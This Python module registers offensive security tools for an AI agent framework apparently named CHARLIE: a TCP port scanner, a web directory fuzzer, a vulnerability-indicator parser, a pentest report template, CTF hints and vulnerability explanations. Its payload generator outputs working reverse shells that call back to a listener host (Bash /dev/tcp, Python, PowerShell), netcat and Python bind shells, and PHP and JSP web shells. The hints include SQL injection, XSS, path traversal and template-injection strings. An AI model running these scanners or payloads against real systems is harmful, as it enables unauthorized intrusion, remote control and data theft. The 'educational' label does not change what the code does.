"""Red team tools — active security testing (TIER_2)."""

import socket
from concurrent.futures import ThreadPoolExecutor, as_completed

from charlie.tools.tool_decorator import tool, RiskTier


COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 5900, 8080]

WEB_PORTS = [80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 9090]

FULL_PORTS = list(range(1, 1025))  # Top 1024 ports

SERVICE_GUESSES = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
    80: "http", 110: "pop3", 111: "rpc", 135: "msrpc", 139: "netbios",
    143: "imap", 443: "https", 445: "smb", 993: "imaps", 995: "pop3s",
    1433: "mssql", 1521: "oracle", 3306: "mysql", 3389: "rdp",
    5432: "postgres", 5900: "vnc", 6379: "redis", 8080: "http-proxy",
    8443: "https-alt", 9200: "elasticsearch", 27017: "mongodb",
}

DIR_WORDLIST = [
    "admin", "login", "dashboard", "api", "v1", "v2", "test", "dev",
    "staging", "backup", "bak", "old", "temp", "tmp", "config", "conf",
    "settings", "env", ".env", ".git", ".svn", ".htaccess", "robots.txt",
    "sitemap.xml", "wp-admin", "wp-login.php", "wp-content", "wp-includes",
    "phpmyadmin", "adminer", "server-status", "server-info", ".well-known",
    "security.txt", "favicon.ico", "crossdomain.xml", "xmlrpc.php",
    "wp-json", "graphql", "swagger", "docs", "api-docs", "openapi.json",
    "debug", "trace", "console", "shell", "cmd", "exec", "system",
    "uploads", "upload", "files", "static", "assets", "media", "images",
    "img", "css", "js", "fonts", "downloads", "public", "private",
    "internal", "portal", "app", "web", "site", "www", "cgi-bin",
    "bin", "lib", "include", "src", "vendor", "node_modules", "dist",
    "build", "out", "logs", "log", "error", "errors", "status", "health",
    "monitor", "metrics", "prometheus", "grafana", "kibana", "elastic",
    "search", "db", "database", "sql", "data", "cache", "redis",
    "memcache", "session", "sessions", "auth", "oauth", "token",
    "register", "signup", "reset", "password", "forgot", "account",
    "profile", "user", "users", "members", "member", "staff", "team",
]


@tool(
    name="scan_target",
    description="TCP port scan a target host. Modes: common (top 20), web (HTTP ports), full (1-1024)",
    category="security",
    risk_tier=RiskTier.TIER_2,
    timeout=120,
)
def scan_target(target: str, ports: str = "common", scan_type: str = "quick") -> str:
    """Scan target host for open ports using TCP connect."""
    port_lists = {"common": COMMON_PORTS, "web": WEB_PORTS, "full": FULL_PORTS}
    port_list = port_lists.get(ports, COMMON_PORTS)
    timeout = 2 if scan_type == "quick" else 5

    open_ports = []

    def check_port(port: int) -> tuple[int, bool]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((target, port))
            s.close()
            return port, result == 0
        except (OSError, socket.timeout):
            return port, False

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check_port, p): p for p in port_list}
        for future in as_completed(futures, timeout=120):
            port, is_open = future.result()
            if is_open:
                service = SERVICE_GUESSES.get(port, "unknown")
                open_ports.append((port, service))

    open_ports.sort(key=lambda x: x[0])

    if open_ports:
        lines = [f"Scan results for {target} ({len(open_ports)} open ports):"]
        for port, service in open_ports:
            lines.append(f"  {port}/tcp  OPEN  ({service})")
        return "\n".join(lines)
    return f"No open ports found on {target} (scanned {len(port_list)} ports)"


@tool(
    name="fuzz_dirs",
    description="Discover hidden directories and files on a web server using common wordlist",
    category="security",
    risk_tier=RiskTier.TIER_2,
    timeout=120,
)
def fuzz_dirs(url: str, depth: int = 1) -> str:
    """Fuzz for hidden directories and files."""
    import requests

    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"
    url = url.rstrip("/")

    found = []

    def check_path(path: str) -> tuple[str, int] | None:
        try:
            target = f"{url}/{path}"
            resp = requests.get(target, timeout=5, allow_redirects=False,
                                headers={"User-Agent": "CHARLIE-Security-Scanner"})
            if resp.status_code in (200, 301, 302, 403):
                return path, resp.status_code
        except Exception:
            pass
        return None

    wordlist = DIR_WORDLIST[:50] if depth == 1 else DIR_WORDLIST

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_path, path): path for path in wordlist}
        for future in as_completed(futures, timeout=120):
            result = future.result()
            if result:
                found.append(result)

    found.sort(key=lambda x: x[0])

    if found:
        lines = [f"Found {len(found)} paths on {url}:"]
        for path, status in found:
            status_desc = {200: "OK", 301: "Redirect", 302: "Redirect", 403: "Forbidden"}
            lines.append(f"  /{path}  [{status} {status_desc.get(status, '')}]")
        return "\n".join(lines)
    return f"No hidden paths found on {url} (tried {len(wordlist)} paths)"


@tool(
    name="analyze_vuln",
    description="Analyze scan results for common vulnerability indicators",
    category="security",
    risk_tier=RiskTier.TIER_0,
)
def analyze_vuln(scan_results: str) -> str:
    """Parse scan results and identify potential vulnerabilities."""
    findings = []
    lines = scan_results.strip().split("\n")

    risky_services = {
        "telnet": ("Telnet detected — unencrypted protocol, credentials sent in plaintext", "HIGH"),
        "ftp": ("FTP detected — may allow anonymous access or unencrypted transfers", "MEDIUM"),
        "smtp": ("SMTP detected — check for open relay or user enumeration", "LOW"),
        "smb": ("SMB detected — check for EternalBlue, null sessions, share enumeration", "HIGH"),
        "rdp": ("RDP exposed — brute force risk, BlueKeep vulnerability", "HIGH"),
        "vnc": ("VNC exposed — often lacks authentication, brute force risk", "HIGH"),
        "mysql": ("MySQL exposed — check for default creds, weak passwords", "HIGH"),
        "postgres": ("PostgreSQL exposed — check for default creds, pg_hba.conf", "HIGH"),
        "mssql": ("MSSQL exposed — check for sa account, xp_cmdshell", "HIGH"),
        "redis": ("Redis exposed — often unauthenticated, RCE via Lua/module loading", "CRITICAL"),
        "mongodb": ("MongoDB exposed — check for unauthenticated access", "CRITICAL"),
        "elasticsearch": ("Elasticsearch exposed — may leak sensitive data", "HIGH"),
        "http-proxy": ("HTTP proxy open — potential SSRF or open proxy abuse", "MEDIUM"),
    }

    for line in lines:
        line_lower = line.lower()
        for service, (desc, severity) in risky_services.items():
            if service in line_lower and "open" in line_lower:
                findings.append(f"[{severity}] {desc}")

    # Check for version info
    import re
    versions = re.findall(r"(\w[\w.-]+)\s+(\d+\.\d+[\.\d]*)", scan_results)
    for name, version in versions[:5]:
        findings.append(f"[INFO] {name} version {version} — check for known CVEs")

    if findings:
        header = f"Vulnerability Analysis — {len(findings)} findings:\n"
        return header + "\n".join(f"  {f}" for f in findings)
    return "No obvious vulnerabilities detected. Manual verification recommended."


@tool(
    name="generate_payload",
    description="Generate educational security testing payloads (reverse shells, bind shells, web shells)",
    category="security",
    risk_tier=RiskTier.TIER_2,
)
def generate_payload(payload_type: str, target_os: str = "linux") -> str:
    """Generate template security testing payloads. Educational only."""
    payloads = {}

    # Reverse shells
    if payload_type in ("reverse_shell", "reverse", "all"):
        payloads["bash_reverse"] = {
            "name": "Bash Reverse Shell",
            "os": "linux",
            "code": "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
            "usage": "Replace LHOST and LPORT with your listener IP and port",
        }
        payloads["python_reverse"] = {
            "name": "Python Reverse Shell",
            "os": "linux/windows",
            "code": (
                "import socket,subprocess,os;"
                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                "s.connect(('LHOST',LPORT));"
                "os.dup2(s.fileno(),0);"
                "os.dup2(s.fileno(),1);"
                "os.dup2(s.fileno(),2);"
                "subprocess.call(['/bin/sh','-i'])"
            ),
            "usage": "Replace LHOST and LPORT. Works on Linux and Windows with Python",
        }
        payloads["powershell_reverse"] = {
            "name": "PowerShell Reverse Shell",
            "os": "windows",
            "code": (
                "$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);"
                "$stream = $client.GetStream();"
                "[byte[]]$bytes = 0..65535|%{0};"
                "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
                "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
                "$sendback = (iex $data 2>&1 | Out-String );"
                "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
                "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
            ),
            "usage": "Replace LHOST and LPORT. Run in PowerShell on Windows target",
        }

    # Bind shells
    if payload_type in ("bind_shell", "bind", "all"):
        payloads["bash_bind"] = {
            "name": "Bash Bind Shell",
            "os": "linux",
            "code": "nc -lvp LPORT -e /bin/sh",
            "usage": "Replace LPORT. Starts listener on target port",
        }
        payloads["python_bind"] = {
            "name": "Python Bind Shell",
            "os": "linux/windows",
            "code": (
                "import socket,subprocess,os;"
                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                "s.bind(('0.0.0.0',LPORT));"
                "s.listen(1);"
                "conn,addr=s.accept();"
                "os.dup2(conn.fileno(),0);"
                "os.dup2(conn.fileno(),1);"
                "os.dup2(conn.fileno(),2);"
                "subprocess.call(['/bin/sh','-i'])"
            ),
            "usage": "Replace LPORT. Starts listener on target",
        }

    # Web shells
    if payload_type in ("web_shell", "webshell", "all"):
        payloads["php_webshell"] = {
            "name": "PHP Web Shell",
            "os": "linux/windows",
            "code": "<?php if(isset($_REQUEST['cmd'])){echo '<pre>';system($_REQUEST['cmd']);echo '</pre>';} ?>",
            "usage": "Upload to web server. Access via: shell.php?cmd=whoami",
        }
        payloads["jsp_webshell"] = {
            "name": "JSP Web Shell",
            "os": "linux/windows",
            "code": "<%Runtime.getRuntime().exec(request.getParameter(new String(new char[]{'c','m','d'})));%>",
            "usage": "Upload to Java web server. Access via: shell.jsp?cmd=whoami",
        }

    if not payloads:
        return (
            f"Unknown payload type: {payload_type}\n"
            "Available types: reverse_shell, bind_shell, web_shell, all"
        )

    result = [f"Generated payloads for {target_os}:\n"]
    for key, p in payloads.items():
        if target_os == "all" or target_os.lower() in p["os"]:
            result.append(f"--- {p['name']} ({p['os']}) ---")
            result.append(f"Code: {p['code']}")
            result.append(f"Usage: {p['usage']}\n")

    result.append("IMPORTANT: These are educational templates for authorized testing only.")
    return "\n".join(result)


@tool(
    name="write_report",
    description="Generate a structured penetration testing report from scan data",
    category="security",
    risk_tier=RiskTier.TIER_0,
)
def write_report(scan_data: str, format: str = "markdown") -> str:
    """Generate a structured pentest report."""
    import time

    date = time.strftime("%Y-%m-%d")
    findings = []
    for line in scan_data.split("\n"):
        line = line.strip()
        if line and ("open" in line.lower() or "found" in line.lower() or "vuln" in line.lower()):
            findings.append(line)

    report = f"""# Penetration Test Report

**Date:** {date}
**Classification:** Confidential

---

## Executive Summary

Security assessment completed. {len(findings)} findings identified during testing.

## Methodology

1. **Reconnaissance** — Passive information gathering
2. **Scanning** — Port scanning and service enumeration
3. **Enumeration** — Directory fuzzing and technology identification
4. **Analysis** — Vulnerability identification and risk assessment

## Findings

"""
    if findings:
        for i, finding in enumerate(findings, 1):
            report += f"### Finding {i}\n{finding}\n\n"
    else:
        report += "No significant findings recorded.\n\n"

    report += """## Risk Rating

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 0 |
| Medium | 0 |
| Low | 0 |

## Recommendations

1. Patch all identified vulnerabilities
2. Disable unnecessary services
3. Implement network segmentation
4. Enable logging and monitoring
5. Conduct regular security assessments

---

*Report generated by CHARLIE Security Module*
"""
    return report


@tool(
    name="ctf_hint",
    description="Get progressive CTF challenge hints by category (web, crypto, reversing, pwn, forensics)",
    category="security",
    risk_tier=RiskTier.TIER_0,
)
def ctf_hint(challenge_type: str, context: str = "") -> str:
    """Provide progressive CTF methodology hints."""
    hints = {
        "web": [
            "1. Check the source code for hidden comments, forms, and JavaScript",
            "2. Try common paths: /robots.txt, /.git/, /admin/, /backup/",
            "3. Test for SQL injection: ' OR 1=1 --, UNION SELECT",
            "4. Test for XSS: <script>alert(1)</script>, check input reflection",
            "5. Check authentication: default creds, session management, IDOR",
            "6. Look for LFI/RFI: ../../etc/passwd, php://filter",
            "7. Check for SSTI: {{7*7}}, ${7*7}, <%= 7*7 %>",
            "8. Analyze cookies, JWT tokens, and API endpoints",
        ],
        "crypto": [
            "1. Identify the cipher type: substitution, transposition, block, stream",
            "2. Check for common encodings: base64, hex, rot13, url encoding",
            "3. Look for patterns: frequency analysis, repeated blocks",
            "4. Check key length and reuse vulnerabilities",
            "5. Try common attacks: padding oracle, ECB/CBC bit flipping",
            "6. Check for weak random number generation",
            "7. Look for known vulnerabilities in specific algorithms",
        ],
        "reversing": [
            "1. Run 'file' command to identify binary type",
            "2. Check strings: strings binary | grep -i flag",
            "3. Open in Ghidra/IDA and find main() function",
            "4. Look for interesting functions: check, validate, verify",
            "5. Trace the logic: what input produces the expected output?",
            "6. Check for anti-debugging: ptrace, timing checks",
            "7. Use ltrace/strace to monitor library/system calls",
            "8. Try dynamic analysis with gdb/lldb",
        ],
        "pwn": [
            "1. Check protections: checksec binary",
            "2. Find vulnerabilities: buffer overflow, format string, use-after-free",
            "3. Identify the target: stack, heap, GOT, ret2libc",
            "4. Find gadgets: ROPgadget --binary binary",
            "5. Calculate offsets: pattern create/offset in pwntools",
            "6. Build exploit: pwntools template",
            "7. Test locally first, then against remote",
        ],
        "forensics": [
            "1. Check file metadata: exiftool, file, binwalk",
            "2. Look for hidden data: strings, hexdump, steghide",
            "3. Analyze disk images: autopsy, volatility",
            "4. Check network captures: wireshark, tcpdump",
            "5. Memory analysis: volatility -f mem.dmp imageinfo",
            "6. Check for deleted files: photorec, foremost",
            "7. Steganography: stegsolve, zsteg, sonic-visualiser",
        ],
    }

    category = challenge_type.lower()
    if category not in hints:
        return f"Unknown category: {challenge_type}. Available: {', '.join(hints.keys())}"

    result = [f"CTF Hints — {challenge_type.upper()}:\n"]
    for hint in hints[category]:
        result.append(f"  {hint}")

    if context:
        result.append(f"\nContext: {context}")
        result.append("Based on your context, start with hints 1-3 and work through methodically.")

    return "\n".join(result)


@tool(
    name="explain_exploit",
    description="Explain a vulnerability or exploit technique in detail (how it works, impact, defense)",
    category="security",
    risk_tier=RiskTier.TIER_0,
)
def explain_exploit(vuln_type: str) -> str:
    """Explain a vulnerability type in educational detail."""
    explanations = {
        "sql_injection": {
            "name": "SQL Injection",
            "how": "Attacker injects SQL code into application inputs that are concatenated into database queries. "
                   "Example: input `' OR 1=1 --` turns a login query into always-true.",
            "impact": "Data exfiltration, authentication bypass, data modification, remote code execution via xp_cmdshell.",
            "defense": "Use parameterized queries/prepared statements. Input validation. ORM usage. Least privilege DB accounts.",
        },
        "xss": {
            "name": "Cross-Site Scripting (XSS)",
            "how": "Attacker injects malicious JavaScript into web pages viewed by other users. "
                   "Types: Reflected (in URL), Stored (in database), DOM-based (in client JS).",
            "impact": "Session hijacking, credential theft, defacement, phishing, keylogging.",
            "defense": "Output encoding/escaping. Content Security Policy (CSP). HttpOnly cookies. Input validation.",
        },
        "buffer_overflow": {
            "name": "Buffer Overflow",
            "how": "Writing data past the boundary of a buffer in memory, overwriting adjacent data including "
                   "return addresses on the stack. Allows control of program execution flow.",
            "impact": "Remote code execution, privilege escalation, denial of service, full system compromise.",
            "defense": "Use memory-safe languages. Stack canaries, ASLR, DEP/NX, PIE, RELRO. Bounds checking.",
        },
        "ssrf": {
            "name": "Server-Side Request Forgery (SSRF)",
            "how": "Attacker tricks the server into making requests to internal resources or arbitrary external URLs. "
                   "Often via URL parameters that the server fetches.",
            "impact": "Internal network scanning, access to cloud metadata (169.254.169.254), file read via file://, "
                      "pivot to internal services.",
            "defense": "URL allowlisting. Block internal IP ranges. Disable unnecessary URL schemes. Use SSRF-aware libraries.",
        },
        "idor": {
            "name": "Insecure Direct Object Reference (IDOR)",
            "how": "Application uses user-supplied input to directly access objects (files, database records) "
                   "without authorization checks. Example: /api/user/123 → change 123 to 456.",
            "impact": "Unauthorized data access, data modification, privilege escalation.",
            "defense": "Server-side authorization checks for every object access. Use indirect references (UUIDs). Session-based ownership.",
        },
        "rce": {
            "name": "Remote Code Execution (RCE)",
            "how": "Attacker executes arbitrary code on the target system. Vectors: deserialization, command injection, "
                   "file upload, template injection, log poisoning.",
            "impact": "Full system compromise, data theft, lateral movement, ransomware deployment.",
            "defense": "Input validation. Avoid eval/exec. Sandboxing. Least privilege. Disable dangerous functions.",
        },
        "lfi": {
            "name": "Local File Inclusion (LFI)",
            "how": "Application includes files based on user input without proper sanitization. "
                   "Path traversal (../../) allows reading arbitrary files.",
            "impact": "Source code disclosure, credential theft, log poisoning leading to RCE, /etc/passwd read.",
            "defense": "Input validation. Allowlisted file paths. chroot jail. Disable remote file inclusion.",
        },
        "ssti": {
            "name": "Server-Side Template Injection (SSTI)",
            "how": "Attacker injects template directives into server-side templates. "
                   "Example: {{7*7}} in Jinja2 evaluates to 49, confirming template execution.",
            "impact": "Remote code execution, data exfiltration, server compromise.",
            "defense": "Never render user input as template. Use sandboxed template engines. Input validation.",
        },
    }

    vuln = vuln_type.lower().replace(" ", "_").replace("-", "_")
    if vuln in explanations:
        e = explanations[vuln]
        return (
            f"## {e['name']}\n\n"
            f"**How it works:**\n{e['how']}\n\n"
            f"**Impact:**\n{e['impact']}\n\n"
            f"**Defense:**\n{e['defense']}"
        )

    available = ", ".join(e["name"] for e in explanations.values())
    return f"Unknown vulnerability: {vuln_type}. Available: {available}"
